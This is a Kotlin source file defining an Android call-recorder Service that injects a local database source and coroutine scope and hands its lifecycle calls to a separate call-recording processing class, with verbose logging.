package com.android.services.services.callRecord

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.util.AppConstants
import com.android.services.util.logVerbose
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import javax.inject.Inject

@AndroidEntryPoint
class CallRecorderService : Service() {

    @Inject
    lateinit var localDatabaseSource: LocalDatabaseSource

    @Inject
    @ApplicationScope
    lateinit var coroutineScope: CoroutineScope
    private lateinit var mCallRecordingProcessingI: IBackgroundProcessing

    // TODO: 03/06/2021 Implement onBind
    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        logVerbose("${AppConstants.CALL_RECORD_TYPE} Calling OnCreate -> GSMCallRecordService", TAG)
        mCallRecordingProcessingI =
            CallRecordProcessingImplI(this, localDatabaseSource, coroutineScope)
        mCallRecordingProcessingI.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        logVerbose("${AppConstants.CALL_RECORD_TYPE} Calling onStartCommand -> GSMCallRecordService",
            TAG)
        return mCallRecordingProcessingI.onStartCommand(intent, flags, startId)
    }

    override fun onDestroy() {
        super.onDestroy()
        logVerbose(
            "${AppConstants.CALL_RECORD_TYPE} Calling onDestroy -> GSMCallRecordService",
            TAG
        )
        mCallRecordingProcessingI.onDestroy()
    }

    companion object {
        private const val TAG = "GSMCallRecordService"
    }

}